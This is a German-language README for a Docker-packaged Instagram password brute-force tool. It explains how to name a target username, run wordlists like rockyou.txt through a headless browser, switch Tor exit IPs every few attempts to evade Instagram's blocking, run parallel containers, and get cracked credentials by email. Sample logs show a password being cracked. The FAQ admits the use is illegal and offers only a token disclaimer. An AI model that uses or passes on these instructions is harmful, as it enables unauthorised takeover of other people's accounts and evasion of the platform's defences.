# 📱 Instagram Bruteforce Tool - Vollständige Dokumentation

Eine automatisierte Instagram-Passwort-Test-Anwendung mit Docker-Unterstützung, Tor-Integration und Email-Benachrichtigungen.

**Inhaltsverzeichnis:**
- [Übersicht](#übersicht)
- [Installation](#installation)
- [Konfiguration](#konfiguration)
- [Verwendung](#verwendung)
- [Logs & Monitoring](#logs--monitoring)
- [Technische Details](#technische-details)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)

---

## Übersicht

### Was macht dieses Tool?

Das Tool automatisiert das Testen von Instagram-Passwörtern:

1. **Liest eine Passwortliste** (z.B. rockyou.txt)
2. **Versucht jeden Login** mit Selenium/Chrome Browser
3. **Loggt alle Versuche** in Konsole und Datei
4. **Wechselt die IP** über Tor (alle X Versuche)
5. **Sendet Email** bei erfolgreichem Fund
6. **Läuft im Docker Container** im Hintergrund

### Features

✅ **Docker & Docker Compose** - Einfaches Deployment
✅ **JSON-Konfiguration** - Keine Code-Änderungen nötig
✅ **Headless/GUI Browser** - Konfigurierbar
✅ **Tor-Integration** - Anonyme IP-Wechsel
✅ **Email-Benachrichtigungen** - Gmail SMTP
✅ **Detaillierte Logs** - Console + Datei
✅ **Hilfsskripte** - Einfache Verwaltung mit `start.sh`

---

## Installation

### Voraussetzungen

- **Docker** & **Docker Compose** installiert
- **macOS/Linux/Windows (WSL2)**
- ~500 MB Speicher für Docker Image

### Docker installieren

**macOS:**
```bash
# Über Homebrew
brew install docker docker-compose

# ODER von Docker.com herunterladen
# https://www.docker.com/products/docker-desktop
```

**Linux:**
```bash
sudo apt-get update
sudo apt-get install docker.io docker-compose
```

**Windows:**
- Installiere Docker Desktop: https://www.docker.com/products/docker-desktop

### Projekt-Setup

```bash
# Zum Projekt wechseln
cd /Users/mark/Desktop/bruteforce

# Erstkonfiguration
./start.sh setup

# Dependencies prüfen
./start.sh build
```

---

## Konfiguration

### config.json Übersicht

Die Konfiguration erfolgt vollständig über `config.json`:

```json
{
  "instagram_username": "zielbenutzer",
  "password_list_path": "/app/passwords.txt",
  "email": {
    "enabled": true,
    "sender_email": "deine-email@gmail.com",
    "sender_password": "xxxx xxxx xxxx xxxx",
    "recipient_email": "kontakt@markb.de",
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587
  },
  "tor": {
    "enabled": true,
    "change_identity_interval": 5
  },
  "browser": {
    "headless": true
  },
  "logging": {
    "level": "INFO",
    "log_file": "/app/logs/bruteforce.log"
  }
}
```

### Konfigurationsfelder erklärt

#### **Haupt-Einstellungen**

| Feld | Beschreibung | Beispiel |
|------|-------------|---------|
| `instagram_username` | Ziel-Benutzername | `"zielbenutzer"` |
| `password_list_path` | Pfad zur Passwortliste (im Docker: `/app/passwords.txt`) | `"/app/passwords.txt"` |

#### **Email-Einstellungen**

| Feld | Beschreibung | Hinweise |
|------|-------------|---------|
| `enabled` | Email aktivieren/deaktivieren | `true` oder `false` |
| `sender_email` | Deine Gmail-Adresse | `"deine-email@gmail.com"` |
| `sender_password` | Gmail App-Passwort (NICHT dein normales PW!) | 16-stellig, mit Leerzeichen |
| `recipient_email` | Empfänger der Benachrichtigung | `"kontakt@markb.de"` |
| `smtp_server` | SMTP-Server (für Gmail) | `"smtp.gmail.com"` |
| `smtp_port` | SMTP-Port | `587` (TLS) |

**⚠️ Gmail App-Passwort erstellen:**
1. Gehe zu https://myaccount.google.com/apppasswords
2. Melde dich an
3. Wähle "Mail" → "Windows Computer" (oder dein Gerät)
4. Google generiert 16-stelliges Passwort
5. Kopiere es: `xxxx xxxx xxxx xxxx`
6. Trage es in `config.json` bei `sender_password` ein

#### **Tor-Einstellungen**

| Feld | Beschreibung | Typ |
|------|-------------|-----|
| `enabled` | Tor aktivieren | `true`/`false` |
| `change_identity_interval` | Neue IP alle X Versuche | Zahl (z.B. `5`) |

**Beispiele:**
```json
// Tor aktiviert - IP wechselt alle 5 Versuche
"tor": {
  "enabled": true,
  "change_identity_interval": 5
}

// Tor deaktiviert (schneller, weniger anonym)
"tor": {
  "enabled": false
}

// Aggressive IP-Wechsel (alle 2 Versuche)
"tor": {
  "enabled": true,
  "change_identity_interval": 2
}
```

#### **Browser-Einstellungen**

| Feld | Beschreibung | Effekt |
|------|-------------|--------|
| `headless` | `true` = Keine GUI | Schneller, speichersparender |
| `headless` | `false` = Mit GUI | Du siehst was passiert |

**Headless Mode:**
```json
// Headless (im Hintergrund, schneller) - Standard für Docker
"browser": {
  "headless": true
}

// Mit GUI (du siehst den Browser) - für Debugging
"browser": {
  "headless": false
}
```

#### **Logging-Einstellungen**

| Feld | Beschreibung | Optionen |
|------|-------------|----------|
| `level` | Logging-Verbosität | `DEBUG`, `INFO`, `WARNING`, `ERROR` |
| `log_file` | Datei-Pfad (im Docker) | `"/app/logs/bruteforce.log"` |

---

## Verwendung

### Schritt-für-Schritt Anleitung

#### 1. Konfiguration anpassen

```bash
# Öffne config.json mit Editor
nano config.json
```

**Zu ändern:**
- `instagram_username` → Ziel-Benutzer
- `sender_email` → Deine Gmail
- `sender_password` → Gmail App-Passwort (von oben)
- `recipient_email` → Wo soll die Benachrichtigung hin

#### 2. Passwortliste vorbereiten

```bash
# Kleine Test-Liste erstellen
nano passwords.txt

# Format (ein Passwort pro Zeile):
password123
123456
qwerty
admin
```

**Oder große Passwortliste:**
```bash
# rockyou.txt nutzen (musst du selbst herunterladfen)
cp ~/Downloads/rockyou.txt passwords.txt

# Erste 10000 Passwörter (um schneller zu testen)
head -n 10000 rockyou.txt > passwords.txt
```

#### 3. Docker Image bauen

```bash
./start.sh build

# Oder manuell:
docker-compose build
```

#### 4. Container starten

```bash
./start.sh start

# Oder manuell:
docker-compose up -d
```

Der Container läuft jetzt **im Hintergrund**!

#### 5. Logs anschauen

```bash
# Live-Logs (CTRL+C zum Beenden)
./start.sh logs

# Oder manuell:
docker-compose logs -f bruteforce

# Letzte 50 Zeilen:
./start.sh logs --tail=50
```

### Beispiel-Session

```bash
$ ./start.sh start
🚀 Starte Container...
✅ Container gestartet!

$ ./start.sh logs
2024-12-07 14:23:45,123 - __main__ - INFO - Bruteforce-Anwendung gestartet (Docker Mode)
2024-12-07 14:23:50,456 - proxy.tor_proxy - INFO - Tor läuft und ist bereit.
2024-12-07 14:23:55,789 - browser.session - INFO - Browser läuft im Headless-Modus
2024-12-07 14:24:01,012 - instahack - INFO - [1/100] Versuche Passwort: password123
2024-12-07 14:24:06,345 - instahack - INFO - Login fehlgeschlagen, nächster Versuch...
2024-12-07 14:24:12,678 - instahack - INFO - [2/100] Versuche Passwort: 123456
2024-12-07 14:24:18,901 - instahack - INFO - Login fehlgeschlagen, nächster Versuch...
...
2024-12-07 14:35:20,234 - __main__ - WARNING - ✓ ERFOLG! Passwort geknackt!
2024-12-07 14:35:20,567 - __main__ - WARNING - Username: zielbenutzer
2024-12-07 14:35:20,890 - __main__ - WARNING - Password: correctpassword
2024-12-07 14:35:25,123 - email_notifier - INFO - Email-Benachrichtigung versendet
```

---

## Logs & Monitoring

### Log-Ausgabe verstehen

**INFO-Level Logs:**
```
[12:34:56] INFO - [5/100] Versuche Passwort: password123
[12:34:57] INFO - Login fehlgeschlagen, nächster Versuch...
[12:35:02] INFO - Tor Identity gewechselt
```

**Erfolg-Meldung:**
```
[14:35:20] WARNING - ✓ ERFOLG! Passwort geknackt!
[14:35:20] WARNING - Username: zielbenutzer
[14:35:20] WARNING - Password: correctpassword
```

**Fehler-Logs:**
```
[12:34:01] ERROR - Browser konnte nicht gestartet werden
[12:34:02] ERROR - Tor verbindung fehlgeschlagen
```

### Log-Dateien

Logs werden an zwei Orten geschrieben:

1. **Console** (mit `docker logs`)
```bash
./start.sh logs
```

2. **Datei** (`logs/bruteforce.log`)
```bash
# Datei anschauen
tail -f logs/bruteforce.log

# Durchsuchen
grep "ERFOLG" logs/bruteforce.log
```

### Monitoring-Befehle

```bash
# Status prüfen
./start.sh status

# Spezifische Logs durchsuchen
docker logs bruteforce 2>&1 | grep "Versuch"

# Nur Fehler anzeigen
docker logs bruteforce 2>&1 | grep "ERROR"

# Erfolgs-Versuche zählen
docker logs bruteforce 2>&1 | grep -c "Versuch"
```

---

## Technische Details

### Projektstruktur

```
bruteforce/
├── config.json                 # ← Ändere diese!
├── passwords.txt               # ← Ändere diese!
├── logs/
│   └── bruteforce.log         # Logs-Datei
├── Dockerfile                  # Docker Image Rezept
├── docker-compose.yml          # Docker Compose Konfiguration
├── .dockerignore               # Docker-Optimierung
├── start.sh                    # Hilfsskript (macOS/Linux)
├── docker_runner.py            # Haupt-Einstiegspunkt für Docker
├── email_notifier.py           # Email-Modul
├── instahack.py                # Instagram Login-Logik
├── browser/
│   ├── session.py             # Selenium Browser Wrapper
│   └── run_browser.py         # Browser Runner
└── proxy/
    ├── tor_proxy.py           # Tor Integration
    └── test_proxy.py          # Proxy Tests
```

### Wie es funktioniert

```
1. docker-compose up -d
   ↓
2. Docker startet Container mit docker_runner.py
   ↓
3. docker_runner.py lädt config.json
   ↓
4. Startet Tor-Dienst im Container
   ↓
5. Startet Selenium/Chrome Browser (Headless)
   ↓
6. Liest passwords.txt Zeile für Zeile
   ↓
7. Für jedes Passwort:
   - Versuche Instagram Login
   - Logge Versuch
   - Wechsle IP wenn nötig
   - Warte zufällig 5-15 Sekunden
   ↓
8. Bei Erfolg:
   - Logge Erfolg
   - Sende Email
   - Beende Container
   ↓
9. Bei Fehler nach allen Passwörtern:
   - Logge Fehler
   - Beende Container
```

### Docker Image Details

Das Dockerfile installiert:
- **Python 3.11** - Laufzeitumgebung
- **Tor** - Anonyme Proxy-Dienste
- **Chromium** - Browser für Selenium
- **ChromeDriver** - Browser-Kontrolle
- **Python-Dependencies** - Aus requirements.txt

Größe: ~1.5 GB (mit allen Dependencies)

### Tor IP-Wechsel

```
Versuch 1-5:  IP 1 (z.B. 1.2.3.4)
              ↓
Tor wechsel (new_identity)
              ↓
Versuch 6-10: IP 2 (z.B. 5.6.7.8)
              ↓
Tor wechsel
              ↓
Versuch 11+:  IP 3 (z.B. 9.10.11.12)
```

---

## Troubleshooting

### Container startet nicht

**Problem:** `docker-compose up -d` zeigt Fehler

**Lösung:**
```bash
# Logs anschauen
docker logs bruteforce

# Falls Config-Fehler:
./start.sh shell
cat config.json  # Auf Syntax-Fehler prüfen

# Container löschen und neu starten
./start.sh clean
./start.sh start
```

### Passwortliste wird nicht gefunden

**Problem:** "Passwortliste nicht gefunden: /app/passwords.txt"

**Lösung:**
```bash
# Prüfe, ob Datei existiert
ls -la passwords.txt

# Falls nicht, erstelle sie
echo "password1" > passwords.txt
echo "password2" >> passwords.txt

# Container neu starten
./start.sh restart
```

### Chrome/Selenium-Fehler

**Problem:** "Chrome failed to start"

**Lösung:**
```bash
# Gehe in Container-Shell
./start.sh shell

# Im Container:
apt-get update
apt-get install -y chromium-browser

# Verlasse Shell und starte neu
exit
./start.sh restart
```

### Email wird nicht versendet

**Problem:** "SMTP-Authentifizierung fehlgeschlagen"

**Lösungen:**
1. **Überprüfe Gmail App-Passwort:**
   - https://myaccount.google.com/apppasswords
   - Nutze das 16-stellige Passwort, NICHT dein normales

2. **Überprüfe Syntax in config.json:**
```json
"email": {
  "enabled": true,
  "sender_email": "deine-email@gmail.com",
  "sender_password": "xxxx xxxx xxxx xxxx"  // Mit Leerzeichen!
}
```

3. **Logs durchsuchen:**
```bash
./start.sh logs | grep -i "email\|smtp"
```

### Tor verbindet sich nicht

**Problem:** "Tor konnte nicht gestartet werden"

**Lösung:**
```bash
./start.sh shell

# Im Container:
service tor status
service tor restart
sleep 5
service tor status

exit
./start.sh restart
```

### Browser-GUI wird angezeigt (unwanted)

**Problem:** Du siehst ein Chrome-Fenster während Bruteforce läuft

**Lösung:**
```json
// In config.json:
"browser": {
  "headless": false  // ← Ändere zu true
}
```

---

## FAQ

### F: Kann ich mehrere Instanzen gleichzeitig starten?

**A:** Ja! Starte mehrere Container mit verschiedenen Passwortlisten:

```bash
# Container 1 mit passwords-1.txt
docker run -d --name bruteforce-1 \
  -v $(pwd)/config.json:/app/config.json:ro \
  -v $(pwd)/passwords-1.txt:/app/passwords.txt:ro \
  instagram-bruteforce

# Container 2 mit passwords-2.txt
docker run -d --name bruteforce-2 \
  -v $(pwd)/config.json:/app/config.json:ro \
  -v $(pwd)/passwords-2.txt:/app/passwords.txt:ro \
  instagram-bruteforce

# Status prüfen
docker ps

# Logs anschauen
docker logs bruteforce-1 -f
docker logs bruteforce-2 -f
```

### F: Wie stoppt der Container, wenn ein Passwort gefunden wird?

**A:** Nach erfolgreichem Login:
1. Loggt das Tool: `✓ ERFOLG! Passwort geknackt!`
2. Sendet Email-Benachrichtigung
3. Beendet sich mit Exit-Code 0

Der Container stoppt dann automatisch.

### F: Kann ich die Passwortliste während des Laufs wechseln?

**A:** Nein, die Datei wird einmal beim Start gelesen. 
- Stoppde: `./start.sh stop`
- Ändere: `nano passwords.txt`
- Starte neu: `./start.sh start`

### F: Warum brauche ich Tor?

**A:** Instagram erkennt und blockt automatische Bruteforce-Versuche. Tor:
- Wechselt alle X Versuche die IP
- Macht dich anonym
- Verhindert schnellere IP-Bans

### F: Ist das legal?

**A:** ⚠️ **Nein! Das verstößt gegen:**
- Instagram Terms of Service
- Potenzielle lokale Gesetze gegen Hacking
- Datenschutzbestimmungen

**Nur verwenden für:**
- Eigene Instagram-Konten
- Sicherheitsforschung mit Erlaubnis
- Bildungszwecke

**Der Autor übernimmt keine Haftung!**

### F: Warum ist der erste Versuch immer langsamer?

**A:** Instagram braucht Zeit zu laden:
- Browser muss starten
- JavaScript muss ausgeführt werden
- Login-Formular muss rendert werden

Danach sind Versuche schneller.

### F: Kann ich den Logging-Level erhöhen?

**A:** Ja, in config.json:

```json
"logging": {
  "level": "DEBUG",  // Zeigt mehr Details
  "log_file": "/app/logs/bruteforce.log"
}
```

`DEBUG` Modus zeigt z.B.:
- XPath-Suche nach Elementen
- Browser-Events
- Timing-Details

### F: Was wenn Instagram Captcha zeigt?

**A:** Das Tool erkennt das und loggt: "Login-Challenge erkannt (Captcha etc.)"
- Wechselt zur nächsten Passwort
- Ändert Tor Exit-Node

Captcha-Lösung ist nicht implementiert.

---

## Zusätzliche Ressourcen

- **Docker Docs:** https://docs.docker.com/
- **Selenium Docs:** https://www.selenium.dev/documentation/
- **Tor Project:** https://www.torproject.org/
- **Gmail App Passwords:** https://myaccount.google.com/apppasswords

---

**Erstellt:** 7. Dezember 2025
**Version:** 1.0
